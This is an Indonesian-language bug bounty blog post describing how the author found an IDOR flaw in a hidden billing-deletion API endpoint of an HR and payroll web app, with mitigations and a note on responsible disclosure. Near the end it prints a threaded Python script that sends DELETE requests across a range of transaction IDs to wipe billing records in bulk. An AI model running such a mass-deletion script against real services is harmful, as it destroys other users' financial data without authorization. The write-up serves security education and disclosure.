+++
date = '2025-09-15T14:10:41Z'
draft = false
title = 'How I Found a Critical Idor That Allowed Deleting All Billing Transactions'
+++
Halo semuanya! Kali ini saya ingin berbagi pengalaman menarik saat melakukan security testing pada beberapa aplikasi web yang berfokus pada free payroll, absenteeism dan employee management.

Bayangkan ini, saya sedang mengeksplorasi sebuah aplikasi web tersebut untuk sekedar pengujian keamanan dan tiba-tiba menemukan sesuatu yang cukup mengejutkan. Sebuah kerentanan Insecure Direct Object Reference (IDOR) yang memungkinkan saya menghapus transaksi billing pengguna lain, tanpa ada otorisasi sama sekali.

Yup, benar-benar semua transaksi.

## Apa itu IDOR? Singkatnya?
Insecure Direct Object Reference (IDOR) adalah celah kontrol akses di mana aplikasi memperbolehkan pengguna mengakses atau memodifikasi objek internal (seperti file, record database, transaksi) langsung, tanpa validasi yang cukup. Dalam kasus ini, jika kamu tahu ID transaksi seseorang, kamu bisa menghapusnya. Tanpa izin. Tanpa ada batasan.

## Menemukan "Pintu Rahasia" Endpoint Tersembunyi
Seperti biasa, saya login ke akun saya, buka **Pengaturan > Billing**. Saya melihat daftar riwayat transaksi, opsi membuat perpanjangan paket baru, tapi tidak ada tombol hapus.

*"Hmmm, mungkin fitur hapus memang sengaja disembunyikan dari user biasa"* pikir saya.

Tapi seorang bug hunter selalu penasaran. Jadi saya lanjut eksplorasi, **Pengaturan > Integrasi > Open API**. Di sana saya menemukan URL dokumentasi API. Awalnya, tidak ada yang menarik sama sekali. Tapi saya tidak menyerah.

![url dokumen api](/images/url_dokumen_api.png)

Setelah beberapa percobaan, akhrinya saya menemukan: ![**https://private.com/docs/hr**](none)

Dan di situlah saya melihat segudang endpoit. Salah satunya langsung bikin saya meneteskan keringat dingin (anjay):

**`DELETE /app/billingTransactions/{id}`**

![endpoint api](/images/dokumen_api.png)

Artinya? Endpoint tersembunyi untuk menghapus transaksi billing, yang tidak pernah muncul di UI.

## Saatnya Menguji: Apakah Endpoint Ini Berfungsi?

Menggunakan Burpsuite Repeater, saya membuat request DELETE sederhana. Response 200 OK. Berhasil. Tapi ini baru bukti endpoint ada, belum bukti IDOR.

Lanjut ke uji coba klasik: **menghapus transaksi milik pengguna lain wkwkw**.

## Cross The Line: Exploit IDOR

Jadi, saya menyiapkan dua akun:
1. Attacker: akun saya
2. Victim: akun percobaan pengguna lain

Sedikit info dari saya,

*Sebagai seorang bug hunter yang menjunjung etika dan mematuhi kebijakan program, penyerang hanya diperbolehkan menguji pada akun miliknya sendiri dan tidak boleh menerapkan uji coba ini pada target nyata. Ingat, ada konsekuensi hukum jika melanggar aturan, jadi selalu berhati-hati!*

### Langkahnya sangat sederhana:
1. Buat transaksi di akun victim, catat ID (misal: 4927)
2. Buat transaksi di akun attacker, catat ID (misal: 4928)
3. Ubah request DELETE milik attacker menjadi ID victim, kirim request

Hasilnya? 200 OK dan transaksi milik victim hilang tanpa jejak.

![request delete api](/images/delete_billing.png)

Boom. IDOR berhasil dieksploitasi, data bisa hilang secara diam-diam. Tanpa peringatan.

## Kenapa Ini Berbahaya?

* Pengguna tidak sadar: Mereka tidak tahu fitur hapus ada. Tidak ada laporan.
* Developer blind spot: Endpoint ada tapi UI tidak menampilkannya. Developer mungkin lupa mengamankan.
* Mass deletion: Dengan script sederhana, ribuan transaksi bisa dihapus hanya dengan mengubah ID.
* Kehilangan integritas data: Laporan keuagan, audit semua bisa kacau.

## Rekomendasi Mitigasi

* Validasi otorisasi ketat di semua endpoint, bukan hanya yang terlihat di UI saja
* Gunakan soft delete daripada menghapus data langsung
* Implementasi audit logging

Prinsipnya tetap sama, setiap endpoint yang memproses data baik yang terlihat di UI maupun tidak, harus memiliki validasi otorisasi yang ketat.

## Exploit Code

Saya tidak menjalankan kode ini karena melanggar etika dan aturan program. Kode ini hanya ditampilkan sebagai contoh untuk *mass deletion billing transactions* melalui IDOR, bukan untuk digunakan di sistem nyata.

```python

#!/usr/bin/env python3

import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

# Ignore SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_idor(session, billing_id):
    url = f"https://private.com/api/v1/app/billingTransactions/{billing_id}"
    headers = {
        "User-Agent": "Exploit IDOR",
        "Authorization": "Bearer <token>",
        "X-App": "hr"
    }
    try:
        response = session.delete(url, headers=headers, verify=False)
        if response.status_code == 200:
            print(f"Success delete billing transaction: {billing_id}")
        else:
            print(f"Billing {billing_id} not found or cannot delete")
    except Exception as e:
        print(f"Error: {e}")

def main():
    max_workers = 10
    try:
        with requests.Session() as session:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                executor.map(lambda i: exploit_idor(session, i), range(999))
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

## Pelajaran Penting

Security thorough obscurity is not security. Menyembunyikan endpoint bukanlah pengaman. Anggap semua endpoint bisa ditemukan. Assume every endpoint is exposed. Semua endpoint, UI-visible atau tidak, harus aman.

---

Saya sudah melaporkan kerentanan ini dan perusahaan menanggapinya dengan cepat. Perbaikan telah diterapkan oleh team developernya, dan saya menerima **"bounty"** sebagai bentuk apresiasi, lumayan buat jajan hehe.

Momen seperti ini selalu bikin saya sadar. Dunia bug bounty selalu penuh kejutan, dan kadang bug paling kritis justru tersembunyi di *"hal-hal kecil yang tidak terlihat"*.

Terima kasih sudah membaca! Kalau ada pertanyaan, follow saya di X (Twitter) yaaa, see you.
